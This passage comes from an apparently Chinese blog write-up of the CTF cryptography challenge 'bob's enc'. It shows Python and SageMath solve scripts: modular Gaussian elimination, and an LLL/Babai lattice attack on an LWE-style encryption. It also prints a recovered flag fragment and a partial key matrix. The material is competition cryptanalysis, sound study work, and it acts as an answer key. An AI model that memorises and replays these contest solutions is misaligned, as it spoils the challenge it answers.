class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">###########################################################</span></span><br><span class="line"><span class="comment"># test</span></span><br><span class="line"><span class="comment">###########################################################</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">print_array</span>(<span class="params">x</span>):</span></span><br><span class="line">    prn = <span class="string">&quot;\t[&quot;</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> x:</span><br><span class="line">        <span class="keyword">if</span> j:</span><br><span class="line">            prn += <span class="string">&quot;%3d, &quot;</span> % j</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            prn += <span class="string">&quot;  0, &quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span> prn[:-<span class="number">2</span>] + <span class="string">&quot;],&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">print_matrix</span>(<span class="params">x</span>):</span></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;[&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> x:</span><br><span class="line">        print_array(i)</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;]&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">random_test</span>(<span class="params">times</span>):</span></span><br><span class="line">    <span class="keyword">import</span> random</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(times):</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;\n============== random test %d ==============\n&quot;</span> % i</span><br><span class="line">        mod = random.randint(<span class="number">5</span>, <span class="number">999</span>)</span><br><span class="line">        col = random.randint(<span class="number">2</span>, <span class="number">30</span>)</span><br><span class="line">        row = random.randint(<span class="number">2</span>, <span class="number">30</span>)</span><br><span class="line"></span><br><span class="line">        solution = <span class="built_in">map</span>(<span class="keyword">lambda</span> x: random.randint(<span class="number">0</span>, mod - <span class="number">1</span>), [xc <span class="keyword">for</span> xc <span class="keyword">in</span> xrange(col)])</span><br><span class="line"></span><br><span class="line">        matrix = []</span><br><span class="line">        <span class="keyword">for</span> y <span class="keyword">in</span> xrange(row):</span><br><span class="line">            array = <span class="built_in">map</span>(<span class="keyword">lambda</span> x: random.randint(<span class="number">0</span>, mod), [xc <span class="keyword">for</span> xc <span class="keyword">in</span> xrange(col)])</span><br><span class="line"></span><br><span class="line">            t = <span class="number">0</span></span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">map</span>(<span class="keyword">lambda</span> x, y: <span class="number">0</span> <span class="keyword">if</span> <span class="literal">None</span> == y <span class="keyword">else</span> x * y, array, solution):</span><br><span class="line">                t += j</span><br><span class="line">            array.append(t % mod)</span><br><span class="line"></span><br><span class="line">            matrix.append(array)</span><br><span class="line"></span><br><span class="line">        run_test(mod, solution, matrix)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">static_test_ex</span>():</span></span><br><span class="line">    mod = <span class="number">37</span></span><br><span class="line">    solution = [<span class="number">6</span>, <span class="number">10</span>, <span class="number">5</span>, <span class="number">11</span>, <span class="number">32</span>, <span class="number">39</span>, <span class="number">6</span>, <span class="number">42</span>, <span class="number">7</span>, <span class="number">18</span>, <span class="number">21</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">27</span>]</span><br><span class="line">    matrix = [</span><br><span class="line">        [<span class="number">32</span>, <span class="number">43</span>, <span class="number">11</span>, <span class="number">27</span>, <span class="number">14</span>, <span class="number">41</span>, <span class="number">27</span>, <span class="number">20</span>, <span class="number">0</span>, <span class="number">37</span>, <span class="number">7</span>, <span class="number">12</span>, <span class="number">9</span>, <span class="number">16</span>, <span class="number">12</span>],</span><br><span class="line">        [<span class="number">23</span>, <span class="number">35</span>, <span class="number">31</span>, <span class="number">25</span>, <span class="number">46</span>, <span class="number">27</span>, <span class="number">48</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">19</span>, <span class="number">43</span>, <span class="number">11</span>, <span class="number">31</span>, <span class="number">24</span>, <span class="number">36</span>],</span><br><span class="line">        [<span class="number">48</span>, <span class="number">10</span>, <span class="number">47</span>, <span class="number">1</span>, <span class="number">42</span>, <span class="number">26</span>, <span class="number">0</span>, <span class="number">21</span>, <span class="number">10</span>, <span class="number">23</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">13</span>, <span class="number">32</span>, <span class="number">41</span>],</span><br><span class="line">        [<span class="number">15</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">24</span>, <span class="number">6</span>, <span class="number">36</span>, <span class="number">4</span>, <span class="number">36</span>, <span class="number">18</span>, <span class="number">46</span>, <span class="number">33</span>, <span class="number">20</span>, <span class="number">4</span>, <span class="number">20</span>, <span class="number">39</span>],</span><br><span class="line">        [<span class="number">4</span>, <span class="number">37</span>, <span class="number">3</span>, <span class="number">39</span>, <span class="number">26</span>, <span class="number">33</span>, <span class="number">13</span>, <span class="number">32</span>, <span class="number">23</span>, <span class="number">11</span>, <span class="number">45</span>, <span class="number">45</span>, <span class="number">29</span>, <span class="number">32</span>, <span class="number">35</span>],</span><br><span class="line">        [<span class="number">38</span>, <span class="number">8</span>, <span class="number">38</span>, <span class="number">47</span>, <span class="number">1</span>, <span class="number">34</span>, <span class="number">36</span>, <span class="number">46</span>, <span class="number">47</span>, <span class="number">0</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">21</span>, <span class="number">31</span>, <span class="number">21</span>],</span><br><span class="line">        [<span class="number">21</span>, <span class="number">3</span>, <span class="number">17</span>, <span class="number">15</span>, <span class="number">46</span>, <span class="number">42</span>, <span class="number">7</span>, <span class="number">17</span>, <span class="number">12</span>, <span class="number">37</span>, <span class="number">30</span>, <span class="number">3</span>, <span class="number">14</span>, <span class="number">12</span>, <span class="number">16</span>],</span><br><span class="line">        [<span class="number">7</span>, <span class="number">22</span>, <span class="number">14</span>, <span class="number">31</span>, <span class="number">31</span>, <span class="number">19</span>, <span class="number">34</span>, <span class="number">46</span>, <span class="number">9</span>, <span class="number">33</span>, <span class="number">12</span>, <span class="number">18</span>, <span class="number">4</span>, <span class="number">15</span>, <span class="number">32</span>],</span><br><span class="line">        [<span class="number">13</span>, <span class="number">41</span>, <span class="number">35</span>, <span class="number">25</span>, <span class="number">19</span>, <span class="number">9</span>, <span class="number">44</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">42</span>, <span class="number">15</span>, <span class="number">20</span>, <span class="number">3</span>, <span class="number">47</span>, <span class="number">29</span>],</span><br><span class="line">        [<span class="number">36</span>, <span class="number">21</span>, <span class="number">36</span>, <span class="number">13</span>, <span class="number">37</span>, <span class="number">40</span>, <span class="number">21</span>, <span class="number">39</span>, <span class="number">2</span>, <span class="number">16</span>, <span class="number">26</span>, <span class="number">4</span>, <span class="number">15</span>, <span class="number">2</span>, <span class="number">23</span>],</span><br><span class="line">        [<span class="number">41</span>, <span class="number">19</span>, <span class="number">28</span>, <span class="number">2</span>, <span class="number">42</span>, <span class="number">24</span>, <span class="number">27</span>, <span class="number">21</span>, <span class="number">21</span>, <span class="number">35</span>, <span class="number">3</span>, <span class="number">18</span>, <span class="number">7</span>, <span class="number">22</span>, <span class="number">36</span>],</span><br><span class="line">        [<span class="number">42</span>, <span class="number">34</span>, <span class="number">17</span>, <span class="number">40</span>, <span class="number">26</span>, <span class="number">7</span>, <span class="number">14</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">46</span>, <span class="number">30</span>, <span class="number">14</span>, <span class="number">34</span>, <span class="number">22</span>, <span class="number">39</span>],</span><br><span class="line">        [<span class="number">18</span>, <span class="number">1</span>, <span class="number">40</span>, <span class="number">38</span>, <span class="number">17</span>, <span class="number">45</span>, <span class="number">24</span>, <span class="number">34</span>, <span class="number">34</span>, <span class="number">9</span>, <span class="number">32</span>, <span class="number">24</span>, <span class="number">9</span>, <span class="number">2</span>, <span class="number">45</span>],</span><br><span class="line">        [<span class="number">43</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">29</span>, <span class="number">47</span>, <span class="number">48</span>, <span class="number">28</span>, <span class="number">37</span>, <span class="number">10</span>, <span class="number">23</span>, <span class="number">35</span>, <span class="number">34</span>, <span class="number">37</span>, <span class="number">44</span>, <span class="number">35</span>],</span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">    run_test(mod, solution, matrix)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">static_test</span>():</span></span><br><span class="line">    mod = <span class="number">26</span></span><br><span class="line">    solution = [<span class="number">23</span>, <span class="number">15</span>, <span class="number">19</span>, <span class="number">13</span>, <span class="number">25</span>, <span class="number">17</span>, <span class="number">24</span>, <span class="number">18</span>, <span class="number">11</span>]</span><br><span class="line">    matrix = [</span><br><span class="line">        [<span class="number">11</span>, <span class="number">12</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>],</span><br><span class="line">        [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>],</span><br><span class="line">        [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">7</span>],</span><br><span class="line">        [<span class="number">14</span>, <span class="number">18</span>, <span class="number">23</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>],</span><br><span class="line">        [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">14</span>, <span class="number">18</span>, <span class="number">23</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>],</span><br><span class="line">        [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">14</span>, <span class="number">18</span>, <span class="number">23</span>],</span><br><span class="line">        [<span class="number">17</span>, <span class="number">5</span>, <span class="number">19</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>],</span><br><span class="line">        [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">17</span>, <span class="number">5</span>, <span class="number">19</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>],</span><br><span class="line">        [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">17</span>, <span class="number">5</span>, <span class="number">19</span>],</span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="built_in">len</span>(matrix)):</span><br><span class="line">        t = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">map</span>(<span class="keyword">lambda</span> x, y: <span class="number">0</span> <span class="keyword">if</span> <span class="literal">None</span> == y <span class="keyword">else</span> x * y, matrix[i], solution):</span><br><span class="line">            t += j</span><br><span class="line">        matrix[i].append(t % mod)</span><br><span class="line"></span><br><span class="line">    run_test(mod, solution, matrix)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run_test</span>(<span class="params">mod, solution, matrix</span>):</span></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;row = %d, col = %d&quot;</span> % (<span class="built_in">len</span>(matrix), <span class="built_in">len</span>(matrix[<span class="number">0</span>]) - <span class="number">1</span>)</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;mod = %d&quot;</span> % (mod)</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;solution =&quot;</span>, solution</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;matrix =&quot;</span></span><br><span class="line">    print_matrix(matrix)</span><br><span class="line"></span><br><span class="line">    g = GaussMatrix(matrix, mod)</span><br><span class="line"></span><br><span class="line">    ret = g.gauss()</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> ret:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;error:&quot;</span></span><br><span class="line">        print_matrix(g.d)</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;error_str:&quot;</span>, g.error_str</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;times:&quot;</span>, g.count</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;result:&quot;</span></span><br><span class="line">        print_matrix(ret)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    data = []</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;/Users/wenhui/Downloads/bob_enc_5d6979d05829e676ea3154e4be14d553/out.txt&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> f.readlines():</span><br><span class="line">            data.append(i)</span><br><span class="line"></span><br><span class="line">    key = []</span><br><span class="line">    <span class="built_in">eval</span>(<span class="string">&#x27;key.append(&#123;0&#125;)&#x27;</span>.<span class="built_in">format</span>(data[<span class="number">0</span>]))</span><br><span class="line">    key = key[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    s = []</span><br><span class="line">    <span class="built_in">eval</span>(<span class="string">&#x27;s.append(&#123;0&#125;)&#x27;</span>.<span class="built_in">format</span>(data[<span class="number">1</span>]))</span><br><span class="line">    s = s[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    matrix = []</span><br><span class="line">    tmp = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(key)):</span><br><span class="line">        tmp = key[i]</span><br><span class="line">        tmp.append(s[i])</span><br><span class="line">        matrix.append(tmp)</span><br><span class="line">    mod = <span class="number">2141</span></span><br><span class="line">    s = GaussMatrix(matrix, mod)</span><br><span class="line">    flag1 = s.gauss()</span><br><span class="line">    <span class="built_in">print</span> flag1  <span class="comment"># [[102, 108, 97, 103, 123, 49, 52, 101, 54, 102, 50, 51, 54, 45, 57, 101, 98, 57, 45, 52, 54]]</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> flag1:</span><br><span class="line">        tmp = []</span><br><span class="line">        <span class="keyword">for</span> each <span class="keyword">in</span> i:</span><br><span class="line">            tmp.append(<span class="built_in">chr</span>(each))</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;&#x27;</span>.join(tmp)</span><br><span class="line"><span class="comment"># [[102, 108, 97, 103, 123, 49, 52, 101, 54, 102, 50, 51, 54, 45, 57, 101, 98, 57, 45, 52, 54]]</span></span><br><span class="line"><span class="comment"># flag&#123;14e6f236-9eb9-46</span></span><br></pre></td></tr></table></figure><p>困惑于flag2的长度几何，以及<strong>噪声</strong>的消除方法</p><p>这里了解到了<strong>LWE</strong></p><blockquote><h3 id="LWE问题"><a href="#LWE问题" class="headerlink" title="LWE问题"></a>LWE问题</h3><p>容错学习问题 （LWE问题， Learning With Errors）是一个机器学习领域中的怀疑难解问题，由Oded Regev 在2005年提出，他因此赢得2018年哥德尔奖。这是一个极性学习问题的一般形式。</p></blockquote><p>但很可惜，一小时内没有成功利用之</p><p>比赛结束后，回到勇者山峰，发现密码也三道题了</p><ul><li>notKnapsack</li><li>bob’s enc</li><li>TrainPlus</li></ul><p>传说殿堂也三道</p><ul><li>bob’s enc</li><li>Train</li><li>TrainPlus</li></ul><p>总体而言，难度上，300分的notKnapsack = TrainPlus &gt; bob’s enc &gt;&gt; Train</p><p>以及，传说殿堂远远没有勇者山峰卷🤔</p><p><img src="https://cdn.jsdelivr.net/gh/Harry0597/Imag@master/uPic/image-20220507205949333.png" alt="传说殿堂"></p><p><img src="https://cdn.jsdelivr.net/gh/Harry0597/Imag@master/uPic/image-20220507205850757.png" alt="勇者山峰"></p><h2 id="后续再跟着其他师傅wp复现吧。"><a href="#后续再跟着其他师傅wp复现吧。" class="headerlink" title="后续再跟着其他师傅wp复现吧。"></a>后续再跟着其他师傅wp复现吧。</h2><h2 id="Bob’enc"><a href="#Bob’enc" class="headerlink" title="Bob’enc"></a>Bob’enc</h2><blockquote><p>以下为赛后复现，我决定尽可能多的挖掘此题价值</p><ul><li>参考<a href="https://blog.csdn.net/qq_53283643/article/details/124652001?spm=1001.2014.3001.5506">尚师傅博客</a></li></ul></blockquote><p><strong>当时的困惑</strong></p><ul><li>题目生成列表时，行数列数究竟多少没看懂</li><li>flag2多长</li><li>LWE如何用</li></ul><p><strong>现在的未知</strong></p><ul><li>解题的矩阵思维</li><li>sage命令背后的数学含义</li><li>过了几个月，学校教的线代已忘</li></ul><p>先上师傅总的题解（…Orz</p><h3 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> sage.modules.free_module_integer <span class="keyword">import</span> IntegerLattice</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> starmap</span><br><span class="line"><span class="keyword">from</span> operator <span class="keyword">import</span> mul</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;out&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    key = <span class="built_in">eval</span>(f.readline())</span><br><span class="line">    c1 = <span class="built_in">eval</span>(f.readline())</span><br><span class="line">    c2 = <span class="built_in">eval</span>(f.readline())</span><br><span class="line"></span><br><span class="line">prime = <span class="number">2141</span></span><br><span class="line"></span><br><span class="line">K = matrix(Zmod(prime), key[:<span class="number">21</span>])</span><br><span class="line">C1 = vector(Zmod(prime), c1[:<span class="number">21</span>])</span><br><span class="line">m1 = K.inverse() * C1  <span class="comment"># m1 = K\C1</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> m1:</span><br><span class="line">    flag += <span class="built_in">chr</span>(i)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Babai&#x27;s Nearest Plane algorithm</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Babai_closest_vector</span>(<span class="params">M, G, target</span>):</span></span><br><span class="line">    small = target</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">reversed</span>(<span class="built_in">range</span>(M.nrows())):</span><br><span class="line">            c = ((small * G[i]) / (G[i] * G[i])).<span class="built_in">round</span>()</span><br><span class="line">            small -= M[i] * c</span><br><span class="line">    <span class="keyword">return</span> target - small</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">m = <span class="number">64</span></span><br><span class="line">n = <span class="number">21</span></span><br><span class="line">q = prime</span><br><span class="line"></span><br><span class="line">A_values = key</span><br><span class="line">b_values = c2</span><br><span class="line"></span><br><span class="line">A = matrix(ZZ, m + n, m)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m):</span><br><span class="line">    A[i, i] = q</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(m):</span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        A[m + y, x] = A_values[x][y]</span><br><span class="line">lattice = IntegerLattice(A, lll_reduce=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">gram = lattice.reduced_basis.gram_schmidt()[<span class="number">0</span>]</span><br><span class="line">target = vector(ZZ, b_values)</span><br><span class="line">res = Babai_closest_vector(lattice.reduced_basis, gram, target)</span><br><span class="line"></span><br><span class="line">R = IntegerModRing(q)</span><br><span class="line">M = Matrix(R, A_values)</span><br><span class="line">ingredients = M.solve_right(res)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> ingredients:</span><br><span class="line">    flag += <span class="built_in">chr</span>(i)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><h3 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h3><p><strong>C1 = multi(key, flag1)</strong></p><p>对于<code>multi</code>，赛时我的理解是：<strong>单模多元线性同余方程</strong></p><p><img src="https://cdn.jsdelivr.net/gh/Harry0597/Imag@master/uPic/IMG_95676E5FB12E-1.jpeg" alt="单模多元线性同余方程"></p><p>其中out里第一个大列表给了Key（所有ki）,第二个列表给了C1（上图左端所有C），所以我找到解此方程的代码，跑出来就是解了。</p><p>值得一提，看题目可知，这有64个方程，21个未知量，所以实际跑解方程的代码让C1 = C1[:21]也可</p><p>而在高深的密码人看来，C1是由定义在<strong>整数域上的p模环矩阵K</strong> 乘 <strong>向量F</strong> [f1, f2, …, f21]得到的：</p><p><strong>矩阵K</strong></p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">[185 <span class="number"> 96 </span>351<span class="number"> 118 </span>421<span class="number"> 449 </span>350<span class="number"> 349 </span>388 <span class="number"> 95 </span>341<span class="number"> 327 </span><span class="number"> 29 </span>156<span class="number"> 399 </span>283<span class="number"> 292 </span>461<span class="number"> 445 </span>120 126]</span><br><span class="line">[495<span class="number"> 358 </span>192<span class="number"> 300 </span>279<span class="number"> 277 </span>478<span class="number"> 335 </span>231<span class="number"> 241 </span>178<span class="number"> 314 </span>453<span class="number"> 251 </span>133<span class="number"> 391 </span>213<span class="number"> 132 </span>254<span class="number"> 388 </span> 46]</span><br><span class="line">[428 <span class="number"> 44 </span>100<span class="number"> 483 </span><span class="number"> 12 </span>311 <span class="number"> 57 </span>443<span class="number"> 289 </span><span class="number"> 90 </span>478<span class="number"> 495 </span>399 <span class="number"> 89 </span>324<span class="number"> 275 </span>322 <span class="number"> 99 </span>343<span class="number"> 489 </span>133]</span><br><span class="line">[420<span class="number"> 358 </span>472<span class="number"> 260 </span>267<span class="number"> 136 </span>303<span class="number"> 491 </span>390<span class="number"> 248 </span>430<span class="number"> 117 </span>154<span class="number"> 244 </span><span class="number"> 62 </span>217<span class="number"> 204 </span>334<span class="number"> 277 </span>231 325]</span><br><span class="line">[<span class="number"> 11 </span><span class="number"> 96 </span><span class="number"> 61 </span><span class="number"> 67 </span>456<span class="number"> 361 </span>292<span class="number"> 278 </span>424<span class="number"> 237 </span>345<span class="number"> 109 </span>475<span class="number"> 473 </span><span class="number"> 29 </span>250<span class="number"> 195 </span>430<span class="number"> 114 </span><span class="number"> 13 </span>199]</span><br><span class="line">[<span class="number"> 17 </span><span class="number"> 91 </span>330 <span class="number"> 73 </span>384<span class="number"> 134 </span>437<span class="number"> 161 </span>166<span class="number"> 185 </span>499<span class="number"> 491 </span>342<span class="number"> 129 </span>348<span class="number"> 162 </span>478<span class="number"> 216 </span>189<span class="number"> 311 </span>502]</span><br><span class="line">[396<span class="number"> 437 </span><span class="number"> 98 </span>421<span class="number"> 120 </span>443<span class="number"> 113 </span>432  <span class="number"> 9 </span>476<span class="number"> 243 </span>122<span class="number"> 416 </span>508<span class="number"> 287 </span><span class="number"> 45 </span><span class="number"> 84 </span>322<span class="number"> 504 </span>287 251]</span><br><span class="line">[187<span class="number"> 489 </span>407<span class="number"> 204 </span>127 <span class="number"> 10 </span>302<span class="number"> 101 </span>389<span class="number"> 113 </span>469<span class="number"> 184 </span>249<span class="number"> 131 </span>113 <span class="number"> 18 </span>350<span class="number"> 106 </span>486<span class="number"> 406 </span>295]</span><br><span class="line">[265<span class="number"> 425 </span><span class="number"> 30 </span>478<span class="number"> 471 </span>211<span class="number"> 162 </span>323<span class="number"> 163 </span>205<span class="number"> 187 </span>422<span class="number"> 452 </span>226<span class="number"> 230 </span>367<span class="number"> 478 </span>229<span class="number"> 365 </span>395 294]</span><br><span class="line">[360<span class="number"> 193 </span>180<span class="number"> 253 </span>337<span class="number"> 453 </span><span class="number"> 16 </span>352<span class="number"> 243 </span>107<span class="number"> 171 </span><span class="number"> 46 </span><span class="number"> 25 </span>234 <span class="number"> 46 </span>479<span class="number"> 267 </span>267<span class="number"> 171 </span>188 127]</span><br><span class="line">[379<span class="number"> 360 </span>109<span class="number"> 360 </span>403<span class="number"> 343 </span><span class="number"> 75 </span>306<span class="number"> 138 </span><span class="number"> 40 </span><span class="number"> 41 </span>253<span class="number"> 428 </span>401<span class="number"> 464 </span>495 <span class="number"> 21 </span>296<span class="number"> 319 </span>410 440]</span><br><span class="line">[<span class="number"> 28 </span>209  <span class="number"> 1 </span>233<span class="number"> 458 </span>266<span class="number"> 301 </span>359<span class="number"> 469 </span>304<span class="number"> 264 </span>368<span class="number"> 339 </span><span class="number"> 25 </span>490<span class="number"> 343 </span>404<span class="number"> 488 </span>275<span class="number"> 262 </span>274]</span><br><span class="line">[180<span class="number"> 372 </span>133<span class="number"> 341 </span><span class="number"> 29 </span>352<span class="number"> 326 </span><span class="number"> 89 </span>323<span class="number"> 479 </span><span class="number"> 68 </span><span class="number"> 76 </span>247<span class="number"> 225 </span>159<span class="number"> 163 </span>180<span class="number"> 160 </span>171  <span class="number"> 7 </span>322]</span><br><span class="line">[322<span class="number"> 295 </span><span class="number"> 28 </span>467<span class="number"> 361 </span>169<span class="number"> 190 </span><span class="number"> 71 </span>456<span class="number"> 140 </span>456<span class="number"> 202 </span>295<span class="number"> 424 </span>428 <span class="number"> 18 </span>286<span class="number"> 233 </span>470<span class="number"> 303 </span>429]</span><br><span class="line">[234 <span class="number"> 37 </span>128<span class="number"> 175 </span>282<span class="number"> 509 </span><span class="number"> 54 </span>186<span class="number"> 177 </span><span class="number"> 23 </span>348<span class="number"> 487 </span>473<span class="number"> 377 </span><span class="number"> 81 </span>225<span class="number"> 154 </span>511<span class="number"> 364 </span>120 280]</span><br><span class="line">[262 <span class="number"> 82 </span>383<span class="number"> 490 </span>128<span class="number"> 448 </span>289<span class="number"> 420 </span>239<span class="number"> 374 </span>392<span class="number"> 149 </span>217<span class="number"> 398 </span>441<span class="number"> 480 </span>453<span class="number"> 503 </span>318<span class="number"> 285 </span>418]</span><br><span class="line">[ <span class="number"> 0 </span>347<span class="number"> 223 </span>381<span class="number"> 469 </span>208<span class="number"> 424 </span>435<span class="number"> 404 </span><span class="number"> 64 </span>107 <span class="number"> 73 </span>490<span class="number"> 116 </span>445<span class="number"> 392 </span>194<span class="number"> 287 </span><span class="number"> 66 </span>325 261]</span><br><span class="line">[<span class="number"> 99 </span><span class="number"> 26 </span>489<span class="number"> 114 </span> <span class="number"> 3 </span>351<span class="number"> 494 </span>174<span class="number"> 369 </span>354<span class="number"> 379 </span>187 <span class="number"> 90 </span>202<span class="number"> 286 </span><span class="number"> 37 </span><span class="number"> 48 </span>397<span class="number"> 298 </span><span class="number"> 65 </span>499]</span><br><span class="line">[455<span class="number"> 114 </span>349<span class="number"> 401 </span> <span class="number"> 5 </span>139<span class="number"> 314 </span>227<span class="number"> 134 </span>258<span class="number"> 270 </span>135<span class="number"> 287 </span>332<span class="number"> 298 </span>272<span class="number"> 167 </span><span class="number"> 43 